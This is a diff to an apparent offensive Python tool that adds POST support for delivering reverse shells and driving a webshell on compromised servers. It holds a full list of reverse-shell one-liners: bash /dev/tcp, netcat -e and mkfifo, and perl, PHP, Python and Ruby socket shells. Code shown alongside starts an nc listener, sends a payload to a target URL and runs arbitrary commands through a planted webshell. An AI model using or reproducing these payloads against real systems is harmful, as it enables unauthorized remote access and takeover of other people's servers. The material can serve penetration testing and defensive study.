@@ -31,11 +31,10 @@ end = "\033[0m"
 #This contains all the payload for displaying the payload on the info area
 #=================================================================================================================================================	
 payloads_dict = { 
-		"bash-196":"\t\t\t0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; bash <&196 >&196 2>&196",
-		"bash":"\t\t\t\tbash -i >& /dev/tcp/127.0.0.1/1337 0>&1",
-		"bash-read-line":"\t\t\texec 5<>/dev/tcp/127.0.0.1/1337;cat <&5 | while read line; do $line 2>&5 >&5; done",
-		"bash-5":"\t\t\t\tbash -i 5<> /dev/tcp/127.0.0.1/1337 0<&5 1>&5 2>&5",
-		"bash-udp":"\t\t\tbash -i >& /dev/udp/127.0.0.1/1337 0>&1",
+		"bash-196":"\t\t\tbash -c '0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; bash <&196 >&196 2>&196'",
+		"bash":"\t\t\t\tbash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'",
+		"bash-read-line":"\t\t\tbash -c 'exec 5<>/dev/tcp/127.0.0.1/1337;cat <&5 | while read line; do $line 2>&5 >&5; done'",
+		"bash-5":"\t\t\t\tbash -c 'bash -i 5<> /dev/tcp/127.0.0.1/1337 0<&5 1>&5 2>&5'",
 		"nc-mkfifo":"\t\t\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 127.0.0.1 1337 >/tmp/f",
 		"nc":"\t\t\t\tnc -e /bin/bash 127.0.0.1 1337",
 		"nc-c":"\t\t\t\tnc -c /bin/bash 127.0.0.1 1337",
@@ -52,6 +51,8 @@ payloads_dict = {
 		"python3-export":"\t\t\texport RHOST=\"127.0.0.1\";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")",
 		"ruby":"\t\t\t\texport RHOST=127.0.0.1;export RPORT=1337;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
 	}
+
+# This idea of printing colored message was taken from Xyan1d3 (https://github.com/Xyan1d3)	
 #=================================================================================================================================================	
   # [+] Green positive message   
 #=================================================================================================================================================	       
@@ -86,28 +87,43 @@ def banner():
 ░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
 ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
 ░                                                
- '| lolcat""") # picks random colors from colors array and display the banner with that color and reset the collor using \033[0m
+ '| $(/usr/bin/which lolcat)""") # picks random colors from colors array and display the banner with that color and reset the collor using \033[0m
 
 
 #=================================================================================================================================================	
 # This function checks the avalibility of the target, if the target is reachable or not. and it also checks if the .php file is there or not
 #=================================================================================================================================================	
-def avalability_check(target , type):
+def avalability_check(target , type , method , param):
 	ainfo("Checking avalability of the Address")
 	splitted_target = list(map(str , target.split('/'))) # Splitts the .php file from the url example. 'cmd.php' from http://127.0.0.1/cmd.php
-	splitted_php_param = list(map(str, splitted_target[-1].split("?")))
+
 	try:
-		r = requests.get(target.replace(type , 'id')) # Checks the availibility of the target by sending a get request
+		if method == "GET":
+			splitted_php_param = list(map(str, splitted_target[-1].split("?")))
+			r = requests.get(target.replace(type , 'id')) # Checks the availibility of the target by sending a get request
+		elif method == "POST":
+			proxydict = {'http' : 'http://127.0.0.1:8080'}
+			data = {param : 'id'}
+			r = requests.post(target , data=data)
+
 		ap("Address is alive")
 		if r.status_code == 200: # Compares the status code to check the availability of the .php file
-			ap(f"Found : {splitted_php_param[0]}")
+			if method == "GET":
+				ap(f"Found : {splitted_php_param[0]}")
+			elif method == "POST":
+				ap(f"Found : {splitted_target[-1]}")
+			print(r.text)
 			if 'uid' in r.text and 'gid' in r.text and 'groups' in r.text: #checks if uid, gid and groups are available on the response
 				ap("Command executed successfully") 
 				return True
 			else:
 				aerr("Command exection failed.")
-				ainfo(f"Check : {splitted_php_param[0]}")
-				aerr("Exitting...")
+				if method == "GET":
+					ainfo(f"Check : {splitted_php_param[0]}")
+					aerr("Exitting...")
+				elif method == "POST":
+					ainfo(f"Check : {splitted_target[-1]}")
+					aerr("Exitting...")
 				return False
 				 # If target address and .php file is available it returns True
 		elif r.status_code == 404:
@@ -122,10 +138,14 @@ def avalability_check(target , type):
 #=================================================================================================================================================	
 # This function checks for the base of the payload example. 'bash' in bash -i /dev/tc..
 #=================================================================================================================================================	
-def payload_base_test(target , payloadtype):
+def payload_base_test(target , payloadtype , method , param):
 	payloadtype = list(map(str , payloadtype.split("-")))[0] #splits the payload base from the payloadtype as bash-196 which wlso uses bash, so we have to split bash-196 using '-' inorder to get the base
 	ainfo(f"Testing the avalability of {payloadtype} on the target")
-	r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}") #sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
+	if method == "GET":
+		r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}")#sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
+	elif method == "POST":
+		data = {param : f"which {payloadtype}"}
+		r = requests.post(target , data)
 	if r.text != "": # This line checks if the response is not blank, if it blanks that means base isn't available
 		ap(f"{payloadtype} is available")
 		return True
@@ -137,20 +157,38 @@ def payload_base_test(target , payloadtype):
 #=================================================================================================================================================	
 # This function sends the payload 
 #=================================================================================================================================================	
-def send_payload(target , payload , port , lstnr=False):
+def send_payload(target , payload ,fmt , port , method, param ,nolstn=False):
 	try:
-		if not lstnr:
-			ainfo("Starting listener")
-			Popen(["nc","-lvnp",port])
-			ainfo("Sending payload")
-			requests.get(target.replace("REV" , payload)) 
-		else:
-			ainfo("Sending payload")
-			try:
-				requests.get(target.replace("REV" , payload) , timeout=2)
-			except requests.exceptions.ReadTimeout:
-				ap("Payload sent successfully")
-				sys.exit() 
+
+		if method.upper() == "GET":
+			if nolstn:
+				try:
+					requests.get(target.replace("REV" ,  urllib.parse.quote_plus(payload)) , timeout=2)
+				except:
+					ap("Payload sent successfully")
+					sys.exit()
+			else:
+				ainfo("Starting listener")
+				Popen(["nc","-lvnp",port])
+				ainfo("Sending payload. Good luck :)")
+				requests.get(target.replace("REV" , urllib.parse.quote_plus(payload)))
+		elif method.upper() == "POST":
+			data = {param : payload }
+			if nolstn:
+				try:
+					requests.post(target , data=data , timeout=2)
+				except:
+					ap("Payload sent successfully")
+					sys.exit()
+			else:
+				ainfo("Starting listener")
+				Popen(["nc","-lvnp",port])
+				ainfo("Sending payload. Good luck :)")
+				requests.post(target , data=data)
+
+
+
+
 	except KeyboardInterrupt:
 		print()
 		aerr("Exitting...")
@@ -158,34 +196,11 @@ def send_payload(target , payload , port , lstnr=False):
 #=================================================================================================================================================	
 # this functiion generates the payload
 #=================================================================================================================================================	
-def payloads(fmt , ip , port):
+def payloads(fmt , ip , port , method):
 	port = str(port)
 	ainfo("Generating Payload")
-	#all payloads are url encoded as webshell sometimes doesn't work without encoding
-	ploads = {
-		"bash-196":"bash -c \"0<%26196%3bexec+196<>/dev/tcp/" + ip + "/" + port + "%3b+bash+<%26196+>%26196+2>%26196\"",
-		"bash":"bash -c \"bash+-i+>%26+/dev/tcp/" + ip + "/" + port + "+0>%261\"",
-		"bash-read-line":"bash -c \"exec+5<>/dev/tcp/" + ip + "/" + port + "%3bcat+<%265+|+while+read+line%3b+do+$line+2>%265+>%265%3b+done\"",
-		"bash-5":"bash -c \"bash+-i+5<>+/dev/tcp/" + ip + "/" + port + "+0<%265+1>%265+2>%265\"",
-		"bash-udp":"bash -c \"bash+-i+>%26+/dev/udp/" + ip + "/" + port + "+0>%261\"",
-		"nc-mkfifo":"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+" + ip + "+" + port + "+>/tmp/f",
-		"nc":"nc+-e+/bin/bash+" + ip + "+" + port + "",
-		"nc-c":"nc+-c+/bin/bash+" + ip + "+" + port + "",
-		"ncat-e":"ncat+" + ip + "+" + port + "+-e+/bin/bash",
-                "perl":"perl+-e+\'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d" + port + "%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"bash+-i\")%3b}%3b\'",
-		"php-exec":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bexec(\"bash+<%263+>%263+2>%263\")%3b\'",
-		"php-shell-exec":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bshell_exec(\"bash+<%263+>%263+2>%263\")%3b\'",
-		"php-system":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bsystem(\"bash+<%263+>%263+2>%263\")%3b\'",
-		"php-passthru":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bpassthru(\"bash+<%263+>%263+2>%263\")%3b\'",
-		"php-popen":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bpopen(\"bash+<%263+>%263+2>%263\",+\"r\")%3b\'",
-		"python":"python+-c+\'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + ip + "\"," + port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn(\"bash\")\'",
-		"python-export":"export+RHOST%3d\"" + ip + "\"%3bexport+RPORT%3d" + port + "%3bpython+-c+\'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(\"bash\")\'",
-		"python3":"python3+-c+\'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + ip + "\"," + port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn(\"bash\")\'",
-		"python3-export":"export+RHOST%3d\"" + ip + "\"%3bexport+RPORT%3d" + port + "%3bpython3+-c+\'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(\"bash\")\'",
-		"ruby":"export+RHOST%3d" + ip + "%3bexport+RPORT%3d" + port + "%3bruby+-rsocket+-e+'exit+if+fork%3bc%3dTCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"])%3bwhile(cmd%3dc.gets)%3bIO.popen(cmd,\"r\"){|io|c.print+io.read}end'"
-	}
-	if fmt in list(ploads.keys()): # This checks if the given format is available on the payload or not 
-		payload = (ploads.get(fmt))
+	if fmt in list(payloads_dict.keys()): # This checks if the given format is available on the payload or not
+		payload =  payloads_dict.get(fmt).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))
 		ap("Payload generated successfully")
 		return payload
 	else:
@@ -280,13 +295,17 @@ def webshell_help(cmd=None):
 #	This function sends every command to the webshell
 #=================================================================================================================================================	
 
-def webshell(target):
+def webshell(target ,method , param):
 	try:
 		ainfo("Use 'help' to see cshell-web commands")
 		ap("Spawning prompt..")
 		time.sleep(2)
-
-		prompt_request = list(map( str , requests.get(target.replace('WEB' , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]")).text.split("\n")))
+		if method == "GET":
+			r = requests.get(target.replace('WEB' , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]"))
+		elif method == "POST":
+			data = {param : "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]"}
+			r = requests.post(target , data=data)
+		prompt_request = list(map( str , r.text.split("\n")))
 
 # Sample output : [OUTPUT_START][PWD_START]/home/test[PWD_END][HOSTNAME_START]ubuntu[HOSTNAME_END][WHOAMI_START]test[WHOAMI_END][OUTPUT_END]
 		for line in prompt_request:
@@ -305,9 +324,14 @@ def webshell(target):
 				inpt = input(prompt(pwd , hostname , whoami)) #creaye prompt and asks for command
 				if webshell_help(inpt): # check if command matches the help
 					continue 
+				if method == "GET":
+					cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
+					res = requests.get(f"{target.replace('WEB' , cmd)}")
+				elif method == "POST":
+					data = {param :f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]" }
+					res = requests.post(target , data=data)
 
-				cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
-				res = requests.get(f"{target.replace('WEB' , cmd)}") # Replacing the web parameter with the cmd
+				 # Replacing the web parameter with the cmd
 				# Filtering the response and sorting necessary responses
 				if "[OUTPUT_START]" in res.text and '[OUTPUT_END]' in res.text:
 					response = res.text.split("[OUTPUT_START]")[1].split('[OUTPUT_END]')[0].split("[PROMPT_START]")
@@ -394,6 +418,9 @@ def main():
 	rev.add_argument('-f', metavar='Format', type=str, required=False , default='bash' ,help='Reverse shell payload format. [Default - bash]')
 	rev.add_argument('--nolstn' , action='store_true' , required=False , help="Don't start the listener" )
 	rev.add_argument('-p', metavar='Listening-Port' , required=False ,default=1337 ,type=int, help='Attacker\'s Port In which the reverse shell will be recived [Default - 1337]. Note : Port must be in-between 1 to 65535')
+	rev.add_argument('-m', metavar='method' , required=False ,default="GET" ,help='Method of sending the request, Example : GET, POST')
+	rev.add_argument('-P', metavar='Parameter' , required=False ,default='cmd' , help='Post request parameter. [Default - cmd]')
+
 	rev_required = rev.add_argument_group('required arguments')
 	rev_required.add_argument('-i', metavar='Listening-IP' , required=True , help='Attacker\'s IP or Interface name for reciving reverse shell')
 	rev_pos = rev.add_argument_group('positional arguments')
@@ -403,6 +430,8 @@ def main():
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 	# web shell arguments
 	web = subparsers.add_parser("web" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It takes a working reverse shell as an argument and executes command on that reverse shell in real time,\n\t      This also shows error message and persists the working directory')
+	web.add_argument('-m', metavar='method' , required=False ,default="GET" ,help='Method of sending the request, Example : GET, POST')
+	web.add_argument('-P', metavar='Parameter' , required=False ,default='cmd' , help='Post request parameter. [Default - cmd]')
 	web_required = web.add_argument_group('positional arguments')
 	web_required.add_argument('target',  metavar="Target" , help="Target URL with 'WEB' as a command. Example : http://127.0.0.1/webshell.php?cmd=WEB")
 
@@ -428,13 +457,21 @@ def main():
 			port = args.p
 			fmt = args.f
 			nolstn = args.nolstn
+			method = args.m.upper()
+
+			if method == "GET" or method == "POST":
+				param = args.P
+			else:
+				aerr("Method not found , Available Methods = ['GET' , 'POST']")
+				sys.exit()
+
 			try: 
 				if IP(ip): #validated ip
 					ip = ip
 			except ValueError: # takes ip from interface
 				ip = get_ip_address(ip)
 
-			if "REV" not in url: #check the rev word
+			if method == "GET" and "REV" not in url: #check the rev word
 				aerr(f"\'REV\' not found on Target URL")
 				sys.exit()
 			if fmt not in list(payloads_dict.keys()):
@@ -445,20 +482,24 @@ def main():
 				aerr("Port is out of range, expected between 1-65535")
 				aerr("Exitting...")
 				sys.exit()
+
 			info( "rev" , url , ip , port , fmt , 'rev')
-			if avalability_check(url , "REV") and payload_base_test(url , fmt):
-				send_payload(url , payloads(fmt , ip , port) , str(port) , lstnr=nolstn)
+			if avalability_check(url  , "REV" , method , param) and payload_base_test(url , fmt , method , param):
+				send_payload(url , payloads(fmt , ip , port , method), fmt , str(port) , method , param, nolstn=nolstn)
 
 	elif args.command == "web":
 		banner()
-		global target_url
 		url = args.target
-		if "WEB" not in url:
+		method = args.m.upper()
+
+		if method == "GET" or method == "POST":
+			param = args.P
+		if method == "GET" and "WEB" not in url:
 			aerr(f"\'WEB\' not found on Target URL")
 			sys.exit()
 		info("web" , url)
-		if avalability_check(url , "WEB"):
-			webshell(url)
+		if avalability_check(url , "WEB" , method , param):
+			webshell(url , method , param)
 	elif args.command == "lstnr":
 		banner()
 		ip = args.i
@@ -474,4 +515,3 @@ def main():
 		banner()
 		myparser.print_help()
 main()
-#print(all_commands("http://127.0.0.1:8000/webshell.php?cmd=WEB"))
